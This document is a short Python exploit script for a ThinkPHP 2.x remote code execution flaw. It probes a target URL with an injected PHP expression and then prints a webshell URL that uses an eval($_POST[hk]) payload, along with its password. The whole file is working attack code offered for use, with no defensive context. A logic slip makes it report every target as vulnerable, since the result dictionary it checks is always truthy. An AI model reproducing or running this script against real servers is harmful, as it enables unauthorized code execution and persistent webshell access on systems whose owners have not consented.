import requests
import re
import urllib

def verify(url):
    relsult = {
        'name': 'Thinkphp 2.x rce',
        'vulnerable': False
    }
    try:
        payload = urllib.parse.urljoin(url, '/index.php?s=a/b/c/${var_dump(md5(1))}')
        response = requests.get(payload, timeout=3)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = payload
            relsult['exp'] = True
        return relsult
    except:
        return relsult

# getshell
def exp():
    url = input('输入目标URL:')
    if verify(url):
        print('[+] 存在 Thinkphp 2.x rce')
        payload = r'/index.php?s=a/b/c/${@print(eval($_POST[hk]))}'
        webshell = url + payload
        print('[+] webshell:', webshell)
        print('[+] 密码: hk')
    else:
        print('不存在漏洞或者有waf!')

if __name__ == '__main__':
    exp()